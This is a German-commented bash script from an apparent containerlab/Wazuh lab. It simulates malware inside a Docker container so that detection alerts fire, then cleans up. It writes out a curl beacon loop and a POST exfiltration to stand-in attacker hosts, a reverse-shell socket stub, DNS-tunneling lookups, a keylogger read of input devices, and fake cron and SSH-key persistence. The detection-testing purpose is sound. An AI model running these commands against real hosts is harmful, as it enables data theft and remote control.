#!/bin/bash
# Angriffsszenario 5: Malware Simulation
# Simuliert verdächtige Aktivitäten wie Malware

echo "=== Malware Simulation Szenario ==="
echo "Dieser Angriff simuliert verdächtige Malware-Aktivitäten"
echo ""

TARGET_NODE="${1:-webserver}"

echo "[+] Starte Malware-Simulation auf $TARGET_NODE"

# Erstelle verdächtige Dateien
echo "[*] Erstelle verdächtige Dateien..."
sudo docker exec clab-dmz-project-sun-$TARGET_NODE bash -c "
    # Erstelle Verzeichnis für 'Malware'
    mkdir -p /tmp/malware_test
    
    # Erstelle EICAR Test-Datei (harmloser Malware-Test-String)
    echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' > /tmp/malware_test/eicar.com
    
    # Erstelle verdächtige Skripte
    cat > /tmp/malware_test/suspicious.sh << 'EOF'
#!/bin/bash
# Verdächtiges Skript
while true; do
    curl -s http://malicious-c2-server.com/beacon
    sleep 300
done
EOF
    chmod +x /tmp/malware_test/suspicious.sh
    
    # Erstelle Backdoor-ähnliche Datei
    cat > /tmp/malware_test/backdoor.py << 'EOF'
import socket
import subprocess
# Reverse Shell Simulation
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
EOF
"

# Simuliere verdächtige Prozesse
echo "[*] Starte verdächtige Prozesse..."
sudo docker exec clab-dmz-project-sun-$TARGET_NODE bash -c "
    # Cryptominer Simulation
    dd if=/dev/zero of=/dev/null bs=1M &
    MINER_PID=\$!
    
    # Keylogger Simulation
    cat /dev/input/event* > /tmp/keylog.txt 2>/dev/null &
    KEYLOG_PID=\$!
    
    sleep 5
    
    # Beende Prozesse
    kill \$MINER_PID 2>/dev/null
    kill \$KEYLOG_PID 2>/dev/null
"

# Simuliere verdächtige Netzwerkaktivität
echo "[*] Simuliere C2-Kommunikation..."
sudo docker exec clab-dmz-project-sun-$TARGET_NODE bash -c "
    # Versuche Verbindung zu bekannten C2-Domains
    for domain in malware-c2.com evil-server.net attacker-control.org; do
        curl -s http://\$domain/beacon -o /dev/null 2>/dev/null || true
        sleep 1
    done
"

# Simuliere Datenexfiltration
echo "[*] Simuliere Datenexfiltration..."
sudo docker exec clab-dmz-project-sun-$TARGET_NODE bash -c "
    # Erstelle 'gestohlene' Daten
    echo 'Sensitive Data: Credit Cards, Passwords, etc.' > /tmp/exfil_data.txt
    
    # Versuche Daten zu exfiltrieren
    curl -X POST -d @/tmp/exfil_data.txt http://attacker-server.com/upload 2>/dev/null || true
    
    # DNS Tunneling Simulation
    for i in {1..10}; do
        nslookup \$(echo 'sensitive-data' | base64).attacker-dns.com 2>/dev/null || true
        sleep 0.5
    done
"

# Simuliere Persistenz-Mechanismen
echo "[*] Simuliere Persistenz-Versuche..."
sudo docker exec clab-dmz-project-sun-$TARGET_NODE bash -c "
    # Crontab Manipulation (wird nicht wirklich ausgeführt)
    echo '*/5 * * * * /tmp/malware_test/suspicious.sh' > /tmp/fake_cron
    
    # SSH Key Manipulation
    mkdir -p /tmp/.ssh_backup
    echo 'ssh-rsa AAAAB3NzaC1... attacker@evil' > /tmp/.ssh_backup/authorized_keys
"

# Aufräumen
echo "[*] Räume auf..."
sudo docker exec clab-dmz-project-sun-$TARGET_NODE bash -c "
    rm -rf /tmp/malware_test
    rm -f /tmp/keylog.txt /tmp/exfil_data.txt /tmp/fake_cron
    rm -rf /tmp/.ssh_backup
"

echo ""
echo "[+] Malware-Simulation abgeschlossen"
echo "[+] Überprüfe Wazuh Dashboard für Alerts: https://localhost:8443"
echo "[+] Suche nach: 'malware', 'suspicious process', 'data exfiltration', 'persistence'"
